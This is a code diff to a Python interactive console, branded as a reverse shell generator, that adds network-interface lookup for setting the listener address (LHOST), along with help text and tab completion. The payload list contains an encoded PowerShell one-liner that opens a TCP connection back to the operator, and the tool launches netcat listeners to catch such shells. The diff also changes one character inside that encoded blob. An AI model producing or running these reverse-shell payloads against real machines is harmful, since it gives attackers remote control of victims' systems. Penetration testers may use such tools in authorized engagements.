@@ -5,8 +5,10 @@ import shlex
 import readline
 import subprocess
 import shutil
-from dataclasses import dataclass
+import socket
+import struct
 import json
+from dataclasses import dataclass
 
 
 class C:
@@ -103,7 +105,7 @@ PAYLOADS: list[Payload] = [
 
     Payload("ps_b64", "PS Base64", "windows",
         "powershell -e "
-        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA"),
+        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAeyBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA"),
 ]
 
 PAYLOAD_MAP    = {p.key: p for p in PAYLOADS}
@@ -111,20 +113,196 @@ PLATFORM_ICON  = {"unix": "🐧", "windows": "🪟", "both": "🌐"}
 NC_CANDIDATES  = ["nc", "ncat", "netcat"]
 
 
+# ─────────────────────────────────────────────
+#  Network interface helpers
+# ─────────────────────────────────────────────
+
+def get_interfaces() -> dict[str, str]:
+    """
+    Return {interface_name: ipv4_address} for all UP interfaces that have an
+    IPv4 address.  Works without netifaces by parsing /proc/net/if_inet6 and
+    /proc/net/fib_trie (Linux) or falling back to `ip addr` / `ifconfig`.
+    """
+    ifaces: dict[str, str] = {}
+
+    # --- Method 1: socket.if_nameindex + getaddrinfo (portable, fast) -------
+    try:
+        import fcntl
+        SIOCGIFADDR = 0x8915
+        for idx, name in socket.if_nameindex():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                packed = fcntl.ioctl(s.fileno(), SIOCGIFADDR,
+                                     struct.pack("256s", name[:15].encode()))
+                ip = socket.inet_ntoa(packed[20:24])
+                s.close()
+                if not ip.startswith("127."):
+                    ifaces[name] = ip
+            except Exception:
+                pass
+        if ifaces:
+            return ifaces
+    except Exception:
+        pass
+
+    # --- Method 2: `ip -4 addr show` ----------------------------------------
+    try:
+        out = subprocess.check_output(
+            ["ip", "-4", "addr", "show"],
+            stderr=subprocess.DEVNULL, text=True
+        )
+        current_iface = None
+        for line in out.splitlines():
+            line = line.strip()
+            if line and line[0].isdigit():
+                current_iface = line.split(":")[1].strip().split("@")[0]
+            elif line.startswith("inet ") and current_iface:
+                ip = line.split()[1].split("/")[0]
+                if not ip.startswith("127."):
+                    ifaces[current_iface] = ip
+        if ifaces:
+            return ifaces
+    except Exception:
+        pass
+
+    # --- Method 3: `ifconfig` ------------------------------------------------
+    try:
+        out = subprocess.check_output(
+            ["ifconfig"], stderr=subprocess.DEVNULL, text=True
+        )
+        current_iface = None
+        for line in out.splitlines():
+            if line and not line[0].isspace():
+                current_iface = line.split(":")[0].split()[0]
+            if "inet " in line and current_iface:
+                parts = line.strip().split()
+                for i, p in enumerate(parts):
+                    if p in ("inet", "addr:"):
+                        ip = parts[i + 1].replace("addr:", "")
+                        if not ip.startswith("127."):
+                            ifaces[current_iface] = ip
+                        break
+        if ifaces:
+            return ifaces
+    except Exception:
+        pass
+
+    return ifaces
+
+
+def resolve_iface_ip(name: str) -> str | None:
+    """Return IPv4 for an interface name, or None if not found."""
+    ifaces = get_interfaces()
+    return ifaces.get(name)
+
+
+def is_interface_name(value: str) -> bool:
+    """Heuristic: does this look like an interface name rather than an IP?"""
+    # An IP address is all digits and dots
+    import re
+    return not bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", value))
+
+
+def print_interfaces(highlight: str | None = None) -> None:
+    """Pretty-print all interfaces with their IPv4 addresses."""
+    ifaces = get_interfaces()
+    W = 52
+    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
+    print(f"{C.BOLD}{C.YELLOW}  {'INTERFACE':<18}{'IPv4':}{C.END}")
+    print(f"{C.dim('─' * W)}")
+    if not ifaces:
+        print(f"  {C.r('No interfaces found.')}")
+    for name, ip in ifaces.items():
+        is_hl = highlight and name == highlight
+        name_col = C.bold(C.g(name)) if is_hl else C.g(name)
+        ip_col   = C.bold(C.c(ip))   if is_hl else ip
+        arrow    = f"  {C.y('◀ selected')}" if is_hl else ""
+        print(f"  {name_col:<{18 + len(C.GREEN) + len(C.END) + (len(C.BOLD) if is_hl else 0)}}{ip_col}{arrow}")
+    print(f"{C.BOLD}{C.YELLOW}{'─' * W}{C.END}\n")
+
+
+def interactive_iface_picker(session: "Session") -> None:
+    """
+    Display numbered list of interfaces, let user pick one by number or name.
+    Returns after setting session.lhost.
+    """
+    ifaces = get_interfaces()
+    if not ifaces:
+        print(C.r("  [-] No interfaces found."))
+        return
+
+    entries = list(ifaces.items())  # [(name, ip), ...]
+    W = 52
+
+    print(f"\n{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
+    print(f"{C.BOLD}{C.YELLOW}  {'#':<5}{'INTERFACE':<18}IPv4{C.END}")
+    print(f"{C.dim('─' * W)}")
+    for i, (name, ip) in enumerate(entries, 1):
+        print(f"  {C.dim(str(i) + '.'):<{5 + len(C.DIM) + len(C.END)}}{C.g(name):<{18 + len(C.GREEN) + len(C.END)}}{ip}")
+    print(f"{C.BOLD}{C.YELLOW}{'─' * W}{C.END}")
+    print(f"  {C.dim('Enter number or interface name (empty to cancel):')}")
+
+    try:
+        choice = input(f"  {C.BOLD}{C.GREEN}>{C.END} ").strip()
+    except (KeyboardInterrupt, EOFError):
+        print()
+        return
+
+    if not choice:
+        print(C.dim("  Cancelled."))
+        return
+
+    selected_name: str | None = None
+    selected_ip:   str | None = None
+
+    if choice.isdigit():
+        idx = int(choice) - 1
+        if 0 <= idx < len(entries):
+            selected_name, selected_ip = entries[idx]
+        else:
+            print(C.r(f"  [-] Invalid number: {choice}"))
+            return
+    elif choice in ifaces:
+        selected_name = choice
+        selected_ip   = ifaces[choice]
+    else:
+        print(C.r(f"  [-] Unknown interface: '{choice}'"))
+        return
+
+    session.lhost = selected_ip
+    change_config(host=selected_ip)
+    print(f"\n  {C.dim('LHOST')} => {C.bold(C.g(selected_ip))}  {C.dim('(' + selected_name + ')')}\n")
+
+
+# ─────────────────────────────────────────────
+#  Session
+# ─────────────────────────────────────────────
+
 class Session:
     def __init__(self):
         self.lhost: str | None = None
         self.lport: str | None = None
 
-    def set(self, key: str, value: str) -> bool:
+    def set(self, key: str, value: str) -> tuple[bool, str | None]:
+        """
+        Returns (success, resolved_ip_or_none).
+        resolved_ip is set when value was an interface name that got resolved.
+        """
         k = key.lower()
         if k in ("ip", "lhost", "host"):
-            self.lhost = value
-            return True
+            if is_interface_name(value):
+                ip = resolve_iface_ip(value)
+                if ip is None:
+                    return False, None   # signal: unknown interface
+                self.lhost = ip
+                return True, ip          # resolved from interface
+            else:
+                self.lhost = value
+                return True, None
         if k in ("port", "lport"):
             self.lport = value
-            return True
-        return False
+            return True, None
+        return False, None
 
     def render_lhost(self) -> str:
         return self.lhost if self.lhost else C.r("<LHOST>")
@@ -132,6 +310,10 @@ class Session:
     def render_lport(self) -> str:
         return self.lport if self.lport else C.r("<LPORT>")
 
+
+# ─────────────────────────────────────────────
+#  Listener / config
+# ─────────────────────────────────────────────
 
 def find_nc() -> tuple[str, str] | None:
     for binary in NC_CANDIDATES:
@@ -196,6 +378,11 @@ def change_config(host: str | None = None, port: str | None = None) -> None:
     except IOError as e:
         print(C.r(f"  [-] Failed to write config: {e}"))
 
+
+# ─────────────────────────────────────────────
+#  UI strings
+# ─────────────────────────────────────────────
+
 BANNER = f"""
 {C.BOLD}{C.RED}
   ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
@@ -206,7 +393,7 @@ BANNER = f"""
   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
 {C.END}{C.DIM}\n\n  Reverse Shell Generator Console  •  Source: Invicti{C.END}
 {C.END}{C.DIM}  Author: {C.BOLD}{C.RED}@ZetaOrioniss{C.END}
-{C.END}{C.DIM}  Version: {C.BOLD}{C.RED}v1.0{C.END}
+{C.END}{C.DIM}  Version: {C.BOLD}{C.RED}v1.1{C.END}
 {C.DIM}\n\n  Type {C.END}{C.BOLD}help{C.END}{C.DIM} to list available commands.{C.END}
 """
 
@@ -218,10 +405,14 @@ HELP = f"""
 
   {C.bold('Configuration')}
   {C.g('load config')}              Load configuration from conf.json
-  {C.g('set ip <address>')}         Set LHOST  (aliases: host, lhost)
+  {C.g('set ip <address|iface>')}   Set LHOST — accepts IP or interface name
   {C.g('set port <port>')}          Set LPORT  (alias: lport)
   {C.g('unset ip|port')}            Clear a value
   {C.g('show options')}             Display current configuration
+
+  {C.bold('Network Interfaces')}
+  {C.g('ifconfig')}  /  {C.g('interfaces')}     List all IPv4 interfaces
+  {C.g('ifconfig pick')}            Interactive interface picker → sets LHOST
 
   {C.bold('Payloads')}
   {C.g('show')}                     List all available payloads
@@ -241,6 +432,10 @@ HELP = f"""
   {C.g('exit')}  /  {C.g('quit')}             Exit the console
 """
 
+
+# ─────────────────────────────────────────────
+#  Display helpers
+# ─────────────────────────────────────────────
 
 def print_all_payloads(session: Session, platform_filter: str | None = None) -> None:
     lhost    = session.render_lhost()
@@ -289,11 +484,23 @@ def print_payload_list() -> None:
     print()
 
 
+# ─────────────────────────────────────────────
+#  Tab completion
+# ─────────────────────────────────────────────
+
 COMMANDS   = ["load", "set", "unset", "use", "run", "generate", "show",
-              "listener", "rlwrap", "clear", "help", "exit", "quit"]
+              "ifconfig", "interfaces", "listener", "rlwrap", "clear",
+              "help", "exit", "quit"]
 SET_KEYS   = ["config", "ip", "port", "lhost", "lport", "host"]
 SHOW_OPTS  = ["payloads", "options"]
 SHELL_KEYS = [p.key for p in PAYLOADS]
+
+
+def _iface_names() -> list[str]:
+    try:
+        return list(get_interfaces().keys())
+    except Exception:
+        return []
 
 
 def completer(text: str, state: int):
@@ -305,12 +512,17 @@ def completer(text: str, state: int):
         opts = [c for c in COMMANDS if c.startswith(text)]
     elif parts[0] == "set" and nparts <= 2:
         opts = [k for k in SET_KEYS if k.startswith(text)]
+    elif parts[0] == "set" and nparts == 3 and parts[1].lower() in ("ip", "host", "lhost"):
+        # Offer interface names as completions for the value
+        opts = [n for n in _iface_names() if n.startswith(text)]
     elif parts[0] in ("use", "run") and nparts <= 2:
         opts = [k for k in SHELL_KEYS if k.startswith(text)]
     elif parts[0] == "show" and nparts <= 2:
         opts = [o for o in SHOW_OPTS if o.startswith(text)]
     elif parts[0] == "unset" and nparts <= 2:
         opts = [k for k in ("ip", "port") if k.startswith(text)]
+    elif parts[0] in ("ifconfig", "interfaces") and nparts <= 2:
+        opts = [o for o in ("pick",) + tuple(_iface_names()) if o.startswith(text)]
     else:
         opts = []
 
@@ -321,11 +533,19 @@ readline.set_completer(completer)
 readline.parse_and_bind("tab: complete")
 
 
+# ─────────────────────────────────────────────
+#  Prompt
+# ─────────────────────────────────────────────
+
 def prompt(session: Session) -> str:
     h = session.lhost or "-"
     p = session.lport or "-"
     return f"{C.BOLD}{C.RED}revshell{C.END} {C.dim(f'({h}:{p})')} {C.BOLD}{C.GREEN}>{C.END} "
 
+
+# ─────────────────────────────────────────────
+#  Main loop
+# ─────────────────────────────────────────────
 
 def run_console() -> None:
     print(BANNER)
@@ -350,17 +570,21 @@ def run_console() -> None:
         cmd  = parts[0].lower()
         args = parts[1:]
 
+        # ── exit ──────────────────────────────────────────────────────────
         if cmd in ("exit", "quit"):
             print(f"\n{C.dim('Goodbye.')}\n")
             break
 
+        # ── help ──────────────────────────────────────────────────────────
         elif cmd == "help":
             print(HELP)
 
+        # ── clear ─────────────────────────────────────────────────────────
         elif cmd == "clear":
             print("\033[2J\033[H", end="")
             print(BANNER)
-        
+
+        # ── load config ───────────────────────────────────────────────────
         elif cmd == "load":
             if len(args) != 1 or args[0].lower() != "config":
                 print(C.r("  Usage: load config"))
@@ -382,19 +606,36 @@ def run_console() -> None:
                 else:
                     print(C.dim("  LPORT not set in config. Run 'set port <port>' to set it."))
 
+        # ── set ───────────────────────────────────────────────────────────
         elif cmd == "set":
             if len(args) < 2:
-                print(C.r("  Usage: set <ip|port> <value>"))
-            elif session.set(args[0], args[1]):
-                label = "LHOST" if args[0].lower() in ("ip", "host", "lhost") else "LPORT"
-                print(f"  {C.dim(label)} => {C.g(args[1])}")
-                if label == "LHOST":
-                    change_config(host=args[1])
-                else:
-                    change_config(port=args[1])
+                print(C.r("  Usage: set <ip|port> <value|interface>"))
             else:
-                print(C.r(f"  [-] Unknown key: '{args[0]}'  (ip, port)"))
+                key_arg = args[0]
+                val_arg = args[1]
+                ok, resolved = session.set(key_arg, val_arg)
 
+                if ok:
+                    label = "LHOST" if key_arg.lower() in ("ip", "host", "lhost") else "LPORT"
+                    if resolved is not None:
+                        # value was an interface name
+                        print(f"  {C.dim(label)} => {C.bold(C.g(resolved))}  {C.dim('(resolved from interface ' + val_arg + ')')}")
+                        change_config(host=resolved)
+                    else:
+                        print(f"  {C.dim(label)} => {C.g(val_arg)}")
+                        if label == "LHOST":
+                            change_config(host=val_arg)
+                        else:
+                            change_config(port=val_arg)
+                else:
+                    # Check if it looked like an interface but wasn't found
+                    if key_arg.lower() in ("ip", "host", "lhost") and is_interface_name(val_arg):
+                        print(C.r(f"  [-] Interface '{val_arg}' not found or has no IPv4 address."))
+                        print(f"  {C.dim('Use')} ifconfig {C.dim('to list available interfaces.')}")
+                    else:
+                        print(C.r(f"  [-] Unknown key: '{key_arg}'  (ip, port)"))
+
+        # ── unset ─────────────────────────────────────────────────────────
         elif cmd == "unset":
             if not args:
                 print(C.r("  Usage: unset <ip|port>"))
@@ -411,6 +652,7 @@ def run_console() -> None:
                 else:
                     print(C.r(f"  [-] Unknown key: '{args[0]}'"))
 
+        # ── show ──────────────────────────────────────────────────────────
         elif cmd == "show":
             sub = args[0].lower() if args else ""
             if sub == "options":
@@ -423,6 +665,20 @@ def run_console() -> None:
             else:
                 print(C.r(f"  [-] Unknown option: '{sub}'  (options, payloads)"))
 
+        # ── ifconfig / interfaces ─────────────────────────────────────────
+        elif cmd in ("ifconfig", "interfaces"):
+            sub = args[0].lower() if args else ""
+            if sub == "pick":
+                interactive_iface_picker(session)
+            elif sub and sub in get_interfaces():
+                # `ifconfig eth0` → show just that one highlighted
+                print_interfaces(highlight=sub)
+            else:
+                print_interfaces()
+                print(f"  {C.dim('Tip:')} {C.g('ifconfig pick')} {C.dim('to interactively set LHOST')}")
+                print(f"  {C.dim('Tip:')} {C.g('set ip <iface>')} {C.dim('to set LHOST from an interface name')}\n")
+
+        # ── use ───────────────────────────────────────────────────────────
         elif cmd == "use":
             if not args:
                 print(C.r("  Usage: use <name>  —  see 'show payloads'"))
@@ -434,6 +690,7 @@ def run_console() -> None:
                     print(C.r(f"  [-] Unknown payload: '{args[0]}'"))
                     print(f"  {C.dim('Type')} show {C.dim('to see the list.')}")
 
+        # ── run / generate ────────────────────────────────────────────────
         elif cmd in ("run", "generate"):
             platform_filter = None
             remaining       = []
@@ -454,18 +711,21 @@ def run_console() -> None:
             else:
                 print_all_payloads(session, platform_filter)
 
+        # ── listener ──────────────────────────────────────────────────────
         elif cmd == "listener":
             if not session.lport:
                 print(C.r("  [-] LPORT not set — type: set port <port>"))
             else:
                 start_listener(session.lport, use_rlwrap=False)
 
+        # ── rlwrap ────────────────────────────────────────────────────────
         elif cmd == "rlwrap":
             if not session.lport:
                 print(C.r("  [-] LPORT not set — type: set port <port>"))
             else:
                 start_listener(session.lport, use_rlwrap=True)
 
+        # ── unknown ───────────────────────────────────────────────────────
         else:
             print(C.r(f"  [-] Unknown command: '{cmd}'"))
             print(f"  {C.dim('Type')} help {C.dim('for available commands.')}")
